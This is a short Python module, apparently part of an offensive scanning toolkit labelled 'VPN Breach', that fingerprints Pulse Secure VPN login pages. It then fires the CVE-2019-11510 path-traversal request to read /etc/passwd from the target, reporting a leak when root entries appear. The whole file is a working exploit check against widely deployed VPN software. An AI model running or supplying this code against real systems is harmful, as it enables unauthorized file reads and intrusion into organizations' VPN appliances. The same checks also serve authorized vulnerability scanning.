import asyncio
from modules.core import console

# Pulse Secure Scanner (VPN Breach)
# Focus: CVE-2019-11510 (Arbitrary File Read).
# Path: /dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/

async def check_pulse(session, url):
    try:
        # Check standard Pulse Login
        login = f"{url.rstrip('/')}/dana-na/auth/url_default/welcome.cgi"
        async with session.get(login, timeout=5, ssl=False) as resp:
            text = await resp.text()
            if "Pulse Secure" in text or "dana-na" in text:
                pass # Confirmed Pulse
                
        # CVE-2019-11510
        target = f"{url.rstrip('/')}/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"
        
        async with session.get(target, timeout=5, ssl=False) as v_resp:
            text = await v_resp.text()
            if "root:x:0:0" in text:
                 return {
                    "url": target,
                    "type": "Pulse Secure File Read (CVE-2019-11510)",
                    "evidence": "/etc/passwd leaked."
                }
            elif v_resp.status == 200 and "root" in text:
                 return {
                    "url": target,
                    "type": "Pulse Secure Suspicious (200 OK)",
                    "evidence": "Endpoint returned 200 OK with 'root' inside."
                }

    except Exception:
        pass
    return None

async def scan_pulse(session, url):
    """
    Scan for Pulse Secure VPN Vulnerabilities.
    """
    console.print(f"\n[bold cyan]--- Pulse Secure Scanner ---[/bold cyan]")
    
    results = []
    res = await check_pulse(session, url)
    if res:
         console.print(f"  [bold red][!] PULSE SECURE LEAK: {res['url']}[/bold red]")
         console.print(f"      Status: {res['type']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No Pulse Secure file leaks found.[/dim]")
        
    return results
